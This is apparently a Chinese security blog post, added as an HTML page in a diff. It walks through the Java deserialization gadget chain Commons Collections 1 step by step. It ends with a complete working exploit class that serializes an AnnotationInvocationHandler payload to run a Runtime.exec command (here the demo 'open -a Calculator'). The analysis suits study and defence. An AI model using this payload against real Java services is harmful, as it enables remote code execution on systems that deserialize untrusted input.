@@ -1,0 +1,533 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>Java反序列化（2）——CC链1 | skkyblu3</title>
+<link rel="shortcut icon" href="https://skyblu3519.github.io/favicon.ico?v=1721054258675">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://skyblu3519.github.io/styles/main.css">
+<link rel="alternate" type="application/atom+xml" title="Java反序列化（2）——CC链1 | skkyblu3 - Atom Feed" href="https://skyblu3519.github.io/atom.xml">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+
+
+
+    <meta name="description" content="调试环境
+JDK
+CC1这条链除了Commons Collections的问题，还有一部分是Java Sun库的问题，所以对JDK的版本也有要求。
+所以JDK版本选择的是8u65，下载链接：https://blog.lupf.cn/arti..." />
+    <meta name="keywords" content="漏洞分析,Java反序列化,JAVA" />
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+    <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  </head>
+  <body>
+    <div class="main">
+      <div class="main-content">
+        <div class="site-header">
+  <a href="https://skyblu3519.github.io">
+  <img class="avatar" src="https://skyblu3519.github.io/images/avatar.png?v=1721054258675" alt="">
+  </a>
+  <h1 class="site-title">
+    skkyblu3
+  </h1>
+  <p class="site-description">
+    Welcome to Internet
+  </p>
+  <div class="menu-container">
+    
+      
+        <a href="/" class="menu">
+          首页
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu">
+          归档
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu">
+          标签
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu">
+          关于
+        </a>
+      
+    
+  </div>
+  <div class="social-container">
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+</div>
+
+        <div class="post-detail">
+          <article class="post">
+            <h2 class="post-title">
+              Java反序列化（2）——CC链1
+            </h2>
+            <div class="post-info">
+              <span>
+                2023-10-08
+              </span>
+              <span>
+                13 min read
+              </span>
+              
+                <a href="https://skyblu3519.github.io/tag/XzhG4n-u0/" class="post-tag">
+                  # 漏洞分析
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/VnhegNlf7/" class="post-tag">
+                  # Java反序列化
+                </a>
+              
+                <a href="https://skyblu3519.github.io/tag/RwDqGW2an/" class="post-tag">
+                  # JAVA
+                </a>
+              
+            </div>
+            
+              <img class="post-feature-image" src="https://skyblu3519.github.io/post-images/java-fan-xu-lie-hua-2-cc-lian-1.jpg" alt="">
+            
+            <div class="post-content-wrapper">
+              <div class="post-content" v-pre>
+                <h1 id="调试环境">调试环境</h1>
+<h2 id="jdk">JDK</h2>
+<p>CC1这条链除了Commons Collections的问题，还有一部分是Java Sun库的问题，所以对JDK的版本也有要求。</p>
+<p>所以JDK版本选择的是8u65，下载链接：<a href="https://blog.lupf.cn/articles/2022/02/19/1645283454543.html">https://blog.lupf.cn/articles/2022/02/19/1645283454543.html</a></p>
+<p>这里千万千万不要在官网下载！它这虽然写的是8u65，但下载下来其实是8u111，其中的漏洞点已经被修复了。<br>
+<img src="https://skyblu3519.github.io/post-images/1696766935420.png" alt="" loading="lazy"></p>
+<h2 id="sun库源码">Sun库源码</h2>
+<p>下载地址：<a href="https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4">https://hg.openjdk.org/jdk8u/jdk8u/jdk/rev/af660750b2f4</a></p>
+<h2 id="commonscollections321-maven依赖">CommonsCollections3.2.1 Maven依赖</h2>
+<p>Apache Commons Collections是Apache Software Foundation提供的一个Java库，该库提供了Java开发者常用的数据结构和工具类，以补充Java标准库中的集合框架。</p>
+<pre><code class="language-xml">&lt;dependencies&gt;
+&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;
+&lt;dependency&gt;
+&lt;groupId&gt;commons-collections&lt;/groupId&gt;
+&lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+&lt;version&gt;3.2.1&lt;/version&gt;
+&lt;/dependency&gt;
+&lt;/dependencies&gt;
+</code></pre>
+<h1 id="cc1链分析">CC1链分析</h1>
+<h2 id="危险方法invokertransformertransform">危险方法——<strong>InvokerTransformer.transform</strong></h2>
+<p>关键点：commons collection的<strong>Transformer</strong>接口，危险方法就在实现<strong>Transformer</strong>接口的<strong>InvokerTransformer</strong>类中。<br>
+<img src="https://skyblu3519.github.io/post-images/1696766959191.png" alt="" loading="lazy"></p>
+<p><strong>InvokerTransformer</strong>的<strong>transform</strong>方法是危险方法<br>
+<img src="https://skyblu3519.github.io/post-images/1696766968253.png" alt="" loading="lazy"></p>
+<p>很典型的反射调用写法</p>
+<pre><code class="language-java">Class cls = input.getClass();
+Method method = cls.getMethod(iMethodName, iParamTypes);
+return method.invoke(input, iArgs);
+</code></pre>
+<p>看看<strong>InvokerTransformer</strong>的构造函数，<strong>methodName</strong>和<strong>paramTypes</strong>在创建实例时传入<br>
+<img src="https://skyblu3519.github.io/post-images/1696766984200.png" alt="" loading="lazy"></p>
+<p><strong>InvokerTransformer</strong>使用方法，熟悉这个格式。</p>
+<ul>
+<li>第一个参数是方法名称，类型是字符串</li>
+<li>第二个参数是方法接收参数的类型，是一个class数组</li>
+<li>第三个是传入方法的参数，是一个Object数组</li>
+</ul>
+<pre><code class="language-java">String cmd = &quot;open -a Calculator&quot;;	// 使用Runtime.exec执行的命令
+Runtime r = Runtime.getRuntime();
+
+InvokerTransformer invokerTransformer = new InvokerTransformer(
+        &quot;exec&quot;,
+        new Class[]{String.class},
+        new Object[]{cmd}
+);      // 传入InvokerTransformer要执行的方法
+invokerTransformer.transform(r);    // 传入执行这个方法的对象
+</code></pre>
+<p>在有了危险方法后，就去找哪里调用了它（如果有readObject调用了它，同时传入的对象还是可控的那就直接成了）。</p>
+<h2 id="调用方法transformedmapchecksetvalue">调用方法——<strong>TransformedMap.checkSetValue</strong></h2>
+<p><s>经过漫长的寻找</s>，<strong>TransformedMap</strong>中的<strong>checkSetValue</strong>的方法调用了它<br>
+<img src="https://skyblu3519.github.io/post-images/1696767010289.png" alt="" loading="lazy"></p>
+<p>看看<strong>TransformedMap</strong>类是怎么个事儿<br>
+<img src="https://skyblu3519.github.io/post-images/1696767019383.png" alt="" loading="lazy"></p>
+<p>我理解是<strong>TransformedMap</strong>相当于是一个Map对象加上了两个额外的<strong>Transformer</strong>属性：<strong>keyTransformer &amp; valueTransformer</strong></p>
+<p>现在来实例化这个类，因为它的构造函数是<strong>protected</strong>，实例它的话调用的是静态方法<strong>decorate</strong><br>
+<img src="https://skyblu3519.github.io/post-images/1696767039329.png" alt="" loading="lazy"></p>
+<p>按照说明来实例化这个类，因为<strong>TransformedMap</strong>间接实现了<strong>Map</strong>接口，所以最后返回的类型是Map</p>
+<pre><code class="language-java">HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+map.put(&quot;key&quot;, &quot;value&quot;);	// 在map中随便插入一组键值对
+Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(
+        map,       			 	 // keyTransformer并不是个必要参数
+        null,       			 // 同时checkSetValue用的是valueTransformer
+        invokerTransformer       // 所以这里可以设置为null
+);
+</code></pre>
+<p>实例化这个类后，看哪里调用了<strong>checkSetValue</strong>方法。<s>经过漫长的寻找</s>，在<strong>TransformedMap</strong>的父类<strong>AbstractInputCheckedMapDecorator</strong>的<strong>MapEntry</strong>类中的<strong>setValue</strong>方法可以看到<strong>checkSetValue</strong>的调用。</p>
+<p>继续之前，需要理解下Java的Map.Entry。Java的Map就像是Pyhton的Dict，是一个键值对。Java中使用键值对遍历Map就会用到Entry对象，Entry就相当于一组键值对。</p>
+<p>而<strong>MapEntry</strong>类就间接继承了Map.Entry，当<strong>TransformedMap</strong>在遍历时的Entry就是这个<strong>MapEntry</strong>。而<strong>checkSetValue</strong>就在它实现的<strong>setValue</strong>方法中被调用。</p>
+<p>所以要利用<strong>TransformedMap</strong>我们需要写一个遍历Map的功能：</p>
+<pre><code class="language-java">for(Map.Entry entry: transformedMap.entrySet()){
+    entry.setValue(r);
+}
+</code></pre>
+<p>调试一下这个代码，看看<strong>MapEntry</strong>是怎么被调用的。首先<strong>transformedMap.entrySet()<strong>会返回一个</strong>EntrySet</strong>对象，第二个parent参数就是<strong>transformedMap</strong><br>
+<img src="https://skyblu3519.github.io/post-images/1696767059848.png" alt="" loading="lazy"></p>
+<p><strong>EntrySet</strong>实现了一个一个<strong>iterator</strong>方法，这个方法返回了一个迭代器对象<strong>EntrySetIterator</strong><br>
+<img src="https://skyblu3519.github.io/post-images/1696767067470.png" alt="" loading="lazy"></p>
+<p><strong>EntrySetIterator</strong>在每一次循环的时候都用调用<strong>next</strong>方法得到当前循环的值，这里它就返回了这个<strong>MapEntry</strong><br>
+<img src="https://skyblu3519.github.io/post-images/1696767098005.png" alt="" loading="lazy"></p>
+<p><strong>MapEntry</strong>的<strong>parent</strong>就是我们一开始传入的transformedMap，所以它在调用<code>setValue(r)</code>的时候就相当于调用了<code>transformedMap.checkSetValue(r)</code><br>
+<img src="https://skyblu3519.github.io/post-images/1696767106323.png" alt="" loading="lazy"></p>
+<h2 id="入口类annotationinvocationhandler">入口类——<strong>AnnotationInvocationHandler</strong></h2>
+<p>接下来我们找一下哪里调用了这个<strong>setValue</strong>方法。<s>经过漫长的寻找</s>，在<strong>AnnotationInvocationHandler</strong>中的<strong>readObject</strong>完美符合我们的条件。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767113663.png" alt="" loading="lazy"></p>
+<ol>
+<li>readObject+参数可控，完美符合一个入口类的要求。</li>
+<li>Map遍历功能，同时Entry还调用了setValue，完美的利用点。</li>
+</ol>
+<h3 id="疑点1无法修改的setvalue参数">疑点1——无法修改的<strong>setValue参数</strong></h3>
+<p>不过这里有一个问题，就是<strong>setValue</strong>的参数并不是可控的。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767132286.png" alt="" loading="lazy"></p>
+<p>根据之前的分析，<strong>setValue</strong>要传入一个<strong>Runtime</strong>的实例，它最后会传入<code>invokerTransformer.transform(r)</code>来执行<strong>exec</strong>方法。现在这里的值已经写死了，有什么办法可以解决呢？</p>
+<p><s>经过漫长的分析</s>，实现<strong>Transformer</strong>接口的还有些可以利用的类。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767167705.png" alt="" loading="lazy"></p>
+<p>无论传入什么<strong>ConstantTransformer</strong>的<strong>transform</strong>都会返回一个固定的值。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767176872.png" alt="" loading="lazy"></p>
+<p>这个值会在实例化这个类的时候传入。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767187588.png" alt="" loading="lazy"></p>
+<p>实验一下</p>
+<pre><code class="language-java">ConstantTransformer constantTransformer = new ConstantTransformer(r);   // 实例化的时候传入Runtime的实例
+invokerTransformer.transform(constantTransformer.transform(&quot;123&quot;));     // 无论传入什么constantTransformer.transform都会返回Runtime的实例
+</code></pre>
+<p>感觉哪里怪怪的，因为这个调用链最后只是让<strong>TransformedMap</strong>的<strong>valueTransformer</strong>调用了一次<strong>transform</strong>方法，实际上是执行的代码是一个<code>O.transform(input)</code>的形式，但上面的写法是让<strong>constantTransformer.transform</strong>的结果作为参数传入<strong>invokerTransformer.transform</strong>中，是一种<code>O1.transform(O2.transform(input))</code>，这显然不符合这个条件。</p>
+<p>这就要<strong>ChainedTransformer</strong>登场了。它的<strong>transform</strong>是对<strong>iTransformers</strong>的一个链式调用<br>
+<img src="https://skyblu3519.github.io/post-images/1696767220112.png" alt="" loading="lazy"></p>
+<p><strong>iTransformers</strong>是一个<strong>Transformer</strong>数组，在实例化时传入。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767228216.png" alt="" loading="lazy"></p>
+<p>按照这个形式，我们实例化一个<strong>ChainedTransformer</strong></p>
+<pre><code class="language-java">ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+    new ConstantTransformer(r),
+    new InvokerTransformer(
+            &quot;exec&quot;,
+            new Class[]{String.class},
+            new Object[]{cmd}
+    )
+});
+chainedTransformer.transform(&quot;skysky&quot;);
+</code></pre>
+<p>这个<strong>chainedTransformer</strong>在调用<strong>transform</strong>的时候无论传入什么都不会影响最后执行的结果，而且也符合这条链最后的调用形式<code>O.transform(input)</code>。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767403570.png" alt="" loading="lazy"></p>
+<p>我们把<code>chainedTransformer</code>放到<code>TransformedMap</code>中验证一下</p>
+<pre><code class="language-java">ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+        new ConstantTransformer(r),
+        new InvokerTransformer(
+                &quot;exec&quot;,
+                new Class[]{String.class},
+                new Object[]{cmd}
+        )
+});
+
+HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+map.put(&quot;key&quot;, &quot;value&quot;);
+Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(
+        map,
+        null,     
+        chainedTransformer     
+);                             
+
+for(Map.Entry entry: transformedMap.entrySet()){
+    entry.setValue(r);
+}
+</code></pre>
+<p>没有任何问题，回到刚刚的<strong>AnnotationInvocationHandler</strong>。这是可序列化的类，同时它在反序列化的时候会通过<code>setValue</code>执行到<code>chainedTransformer.transform(input)</code>，虽然input无法控制，但是我们已经通过<code>ConstantTransformer</code>让最后的结果不受input影响了。</p>
+<p>关于<strong>AnnotationInvocationHandler</strong>的两个参数，<strong>memberValues</strong>直接就是<strong>transformedMap</strong>，<strong>type</strong>则是一个<strong>Annotation</strong>的子类。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767426543.png" alt="" loading="lazy"></p>
+<p>把完整的链写出来，因为<strong>AnnotationInvocationHandler</strong>并不是一个public类，实例它的话只能通过反射。</p>
+<pre><code class="language-java">String cmd = &quot;open -a Calculator&quot;;
+Runtime r = Runtime.getRuntime();
+
+ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+        new ConstantTransformer(r),
+        new InvokerTransformer(
+                &quot;exec&quot;,
+                new Class[]{String.class},
+                new Object[]{cmd}
+        )
+});
+
+HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+map.put(&quot;key&quot;, &quot;value&quot;);
+Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(
+        map,
+        null,
+        chainedTransformer
+);
+
+// AnnotationInvocationHandler实例化
+Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+Constructor constantTransformer = c.getDeclaredConstructor(Class.class, Map.class);
+constantTransformer.setAccessible(true);
+Object o = constantTransformer.newInstance(Override.class, transformedMap);
+
+// 序列化/反序列化
+serialize(o);
+unserialize(&quot;cc1.ser&quot;);
+</code></pre>
+<p><code>o</code>就是最后得到的反序列化对象。但是运行这段代码会出现报错<br>
+<img src="https://skyblu3519.github.io/post-images/1696767446577.png" alt="" loading="lazy"></p>
+<h3 id="疑点2无法序列化的runtime">疑点2——无法序列化的Runtime</h3>
+<p>问题出在ChainedTransformer对象实例化时的<code>new ConstantTransformer(r)</code>。在序列化一个对象的时候，它的所有属性和成员变量也会被尝试序列化。而这里传入的<code>r</code>是一个<strong>Runtime</strong>，而<strong>Runtime</strong>没有使用<strong>Serializable</strong>也就不能被序列化，</p>
+<p>虽然<strong>Runtime</strong>不能被序列化，但是<strong>Runtime.class</strong>是可以被序列化的。所以我们用<strong>Runtime.class</strong>反射获取最后传入<strong>invokerTransformer.transform()<strong>中的</strong>Runtime</strong>对象。</p>
+<pre><code class="language-java">Class rc = Runtime.class;
+Method getRuntionMethod = rc.getDeclaredMethod(&quot;getRuntime&quot;, null);     // 因为是无参方法，所以参数类型为null
+Runtime r = (Runtime) getRuntionMethod.invoke(null, null);  // 以为是无参静态方法，所以调用对象和参数都为null
+</code></pre>
+<p>将这个流程用<strong>invokerTransformer</strong>来实现。</p>
+<p>第一步是<strong>Runtime.class</strong>调用<strong>getDeclaredMethod</strong>，<strong>getDeclaredMethod</strong>的声明为<code>public Method getDeclaredMethod(String name, Class&lt;?&gt;... parameterTypes)</code>，第一个参数类型是String，学习下第二个<code>Class&lt;?&gt;... parameterTypes</code></p>
+<ol>
+<li><strong>Class&lt;?&gt;</strong>: 这部分表示一个通用的 <strong>Class</strong> 类型。<strong>?</strong> 是一个通配符，表示这可以是任何类型的 Class 对象，如 <strong>Class&lt;String&gt;</strong>, <strong>Class&lt;Integer&gt;</strong>, 等等。</li>
+<li><strong>...</strong>: 这是Java的可变参数（varargs）的表示方法。它允许你在调用该方法时传入任意数量的参数。</li>
+<li>所以 <strong>parameterTypes</strong> 实际上是一个 <strong>Class[]</strong> 类型的数组。</li>
+</ol>
+<pre><code class="language-java">Class rc = Runtime.class;
+Method getRuntionMethod = (Method)  new InvokerTransformer(
+    &quot;getMethod&quot;,
+    new Class[]{String.class, Class[].class},
+    new Object[]{&quot;getRuntime&quot;, null}
+).transform(rc);
+</code></pre>
+<p>第二步是<strong>getRuntionMethod</strong>调用<strong>invoke</strong>，<strong>invoke</strong>的声明为<strong>public Object invoke(Object obj, Object... args)</strong></p>
+<pre><code class="language-java">Runtime r = (Runtime) new InvokerTransformer(
+        &quot;invoke&quot;,
+        new Class[]{Object.class, Object[].class},
+        new Object[]{null, null}
+).transform(getRuntionMethod);
+</code></pre>
+<p>这个流程又是一个<strong>InvokerTransformer</strong>的链式调用，所以将其拼装到<strong>ChainedTransformer</strong>中。测试一下</p>
+<pre><code class="language-java">ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+        new ConstantTransformer(rc),
+        new InvokerTransformer(
+                &quot;getMethod&quot;,
+                new Class[]{String.class, Class[].class},
+                new Object[]{&quot;getRuntime&quot;, null}
+        ),
+        new InvokerTransformer(
+                &quot;invoke&quot;,
+                new Class[]{Object.class, Object[].class},
+                new Object[]{null, null}
+        ),
+        new InvokerTransformer(
+                &quot;exec&quot;,
+                new Class[]{String.class},
+                new Object[]{cmd}
+        )
+});
+chainedTransformer.transform(&quot;skky&quot;);
+</code></pre>
+<h3 id="疑点3readobject的判断">疑点3——readObject的判断</h3>
+<p>现在Runtime的问题解决了，但是这条链依然走不通。原因是readObject中，要走到setValue还要通过一个判断。而此处<code>Class&lt;?&gt; memberType = memberTypes.get(name);</code>返回了一个null，导致无法进入后面的代码。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767740443.png" alt="" loading="lazy"></p>
+<p>调试一下看看是怎么个事儿。首先代码会根据传入的<strong>type</strong>，这里就是<strong>Override.class</strong>获取一个annotationType对象。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767750941.png" alt="" loading="lazy"></p>
+<p>经过一个很长的调用链，最后<strong>annotationType</strong>的内容是，这似乎是<strong>Override.class</strong>的一个基本信息，而<strong>Member types</strong>似乎是其中成员变量的信息。因为Override这个类没有任何成员变量，所以<strong>Member types</strong>为空。<br>
+<img src="https://skyblu3519.github.io/post-images/1696767761608.png" alt="" loading="lazy"><br>
+<img src="https://skyblu3519.github.io/post-images/1696767790672.png" alt="" loading="lazy"></p>
+<p>然后<code>annotationType.memberTypes()</code>会返回<strong>annotationType中</strong>的<strong>Member types</strong>，根据变量类型我们知道这个是一个Map<br>
+<img src="https://skyblu3519.github.io/post-images/1696767800471.png" alt="" loading="lazy"></p>
+<p>紧接着在<code>memberTypes.get(name);</code>，这个name是我们字典的key值，因为<strong>memberTypes</strong>为空，自然<strong>memberType</strong>就为null了<br>
+<img src="https://skyblu3519.github.io/post-images/1696767810140.png" alt="" loading="lazy"></p>
+<p>知道原因后，那我们就找一个继承了Annotation且有成员变量的类——<strong>Target</strong><br>
+<img src="https://skyblu3519.github.io/post-images/1696767826222.png" alt="" loading="lazy"></p>
+<p>它有一个成员变量value，我们用它来修改我们的链</p>
+<pre><code class="language-java">// ... 代码不变
+
+HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+map.put(&quot;value&quot;, &quot;value&quot;);	// 将&quot;key&quot;改为&quot;value&quot;
+
+// ... 代码不变
+Object o = constantTransformer.newInstance(Target.class, transformedMap);	// Override改为Target
+
+// ... 代码不变
+</code></pre>
+<p>成功执行<br>
+<img src="https://skyblu3519.github.io/post-images/1696767697243.png" alt="" loading="lazy"></p>
+<h1 id="总结">总结</h1>
+<p>装模作样画个流程图<br>
+<img src="https://skyblu3519.github.io/post-images/1696767706332.png" alt="" loading="lazy"></p>
+<p>最后的完整代码</p>
+<pre><code class="language-java">package CC1;
+
+import org.apache.commons.collections.Transformer;
+import org.apache.commons.collections.functors.ChainedTransformer;
+import org.apache.commons.collections.functors.ConstantTransformer;
+import org.apache.commons.collections.functors.InvokerTransformer;
+import org.apache.commons.collections.map.TransformedMap;
+
+import java.io.*;
+import java.lang.annotation.Target;
+import java.util.HashMap;
+import java.util.Map;
+import java.lang.reflect.Constructor;
+
+public class CC1 {
+    public static void main(String[] args) throws Exception{
+        String cmd = &quot;open -a Calculator&quot;;
+        Class rc = Runtime.class;
+
+        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]{
+                new ConstantTransformer(rc),
+                new InvokerTransformer(
+                        &quot;getMethod&quot;,
+                        new Class[]{String.class, Class[].class},
+                        new Object[]{&quot;getRuntime&quot;, null}
+                ),
+                new InvokerTransformer(
+                        &quot;invoke&quot;,
+                        new Class[]{Object.class, Object[].class},
+                        new Object[]{null, null}
+                ),
+                new InvokerTransformer(
+                        &quot;exec&quot;,
+                        new Class[]{String.class},
+                        new Object[]{cmd}
+                )
+        });
+
+        HashMap&lt;Object, Object&gt; map = new HashMap&lt;&gt;();
+        map.put(&quot;value&quot;, &quot;value&quot;);
+        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(
+                map,
+                null,
+                chainedTransformer
+        );
+
+        Class c = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
+        Constructor constantTransformer = c.getDeclaredConstructor(Class.class, Map.class);
+        constantTransformer.setAccessible(true);
+        Object o = constantTransformer.newInstance(Target.class, transformedMap);
+
+        serialize(o);
+        unserialize(&quot;cc1.ser&quot;);
+    }
+
+    public static Object unserialize(String Filename) throws IOException, ClassNotFoundException{
+        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(Filename));
+        Object obj = ois.readObject();
+        return obj;
+    }
+
+    public static void serialize(Object obj) throws IOException{
+        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(&quot;cc1.ser&quot;));
+        oos.writeObject(obj);
+        oos.close();
+    }
+}
+
+</code></pre>
+<p>至此CC1链完全结束，好累......</p>
+
+              </div>
+              <div class="toc-container">
+                <ul class="markdownIt-TOC">
+<li><a href="#%E8%B0%83%E8%AF%95%E7%8E%AF%E5%A2%83">调试环境</a>
+<ul>
+<li><a href="#jdk">JDK</a></li>
+<li><a href="#sun%E5%BA%93%E6%BA%90%E7%A0%81">Sun库源码</a></li>
+<li><a href="#commonscollections321-maven%E4%BE%9D%E8%B5%96">CommonsCollections3.2.1 Maven依赖</a></li>
+</ul>
+</li>
+<li><a href="#cc1%E9%93%BE%E5%88%86%E6%9E%90">CC1链分析</a>
+<ul>
+<li><a href="#%E5%8D%B1%E9%99%A9%E6%96%B9%E6%B3%95invokertransformertransform">危险方法——<strong>InvokerTransformer.transform</strong></a></li>
+<li><a href="#%E8%B0%83%E7%94%A8%E6%96%B9%E6%B3%95transformedmapchecksetvalue">调用方法——<strong>TransformedMap.checkSetValue</strong></a></li>
+<li><a href="#%E5%85%A5%E5%8F%A3%E7%B1%BBannotationinvocationhandler">入口类——<strong>AnnotationInvocationHandler</strong></a>
+<ul>
+<li><a href="#%E7%96%91%E7%82%B91%E6%97%A0%E6%B3%95%E4%BF%AE%E6%94%B9%E7%9A%84setvalue%E5%8F%82%E6%95%B0">疑点1——无法修改的<strong>setValue参数</strong></a></li>
+<li><a href="#%E7%96%91%E7%82%B92%E6%97%A0%E6%B3%95%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84runtime">疑点2——无法序列化的Runtime</a></li>
+<li><a href="#%E7%96%91%E7%82%B93readobject%E7%9A%84%E5%88%A4%E6%96%AD">疑点3——readObject的判断</a></li>
+</ul>
+</li>
+</ul>
+</li>
+<li><a href="#%E6%80%BB%E7%BB%93">总结</a></li>
+</ul>
+
+              </div>
+            </div>
+          </article>
+        </div>
+
+        
+          <div class="next-post">
+            <div class="next">下一篇</div>
+            <a href="https://skyblu3519.github.io/post/java-fan-xu-lie-hua-1-ji-chu-ru-men/">
+              <h3 class="post-title">
+                Java反序列化（1）—— 基础入门
+              </h3>
+            </a>
+          </div>
+        
+
+        
+
+        <div class="site-footer">
+  Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a>
+  <a class="rss" href="https://skyblu3519.github.io/atom.xml" target="_blank">
+    <i class="ri-rss-line"></i> RSS
+  </a>
+</div>
+
+      </div>
+    </div>
+
+    <script>
+      hljs.initHighlightingOnLoad()
+
+      let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+      // This should probably be throttled.
+      // Especially because it triggers during smooth scrolling.
+      // https://lodash.com/docs/4.17.10#throttle
+      // You could do like...
+      // window.addEventListener("scroll", () => {
+      //    _.throttle(doThatStuff, 100);
+      // });
+      // Only not doing it here to keep this Pen dependency-free.
+
+      window.addEventListener("scroll", event => {
+        let fromTop = window.scrollY;
+
+        mainNavLinks.forEach((link, index) => {
+          let section = document.getElementById(decodeURI(link.hash).substring(1));
+          let nextSection = null
+          if (mainNavLinks[index + 1]) {
+            nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+          }
+          if (section.offsetTop <= fromTop) {
+            if (nextSection) {
+              if (nextSection.offsetTop > fromTop) {
+                link.classList.add("current");
+              } else {
+                link.classList.remove("current");    
+              }
+            } else {
+              link.classList.add("current");
+            }
+          } else {
+            link.classList.remove("current");
+          }
+        });
+      });
+
+    </script>
+  </body>
+</html>
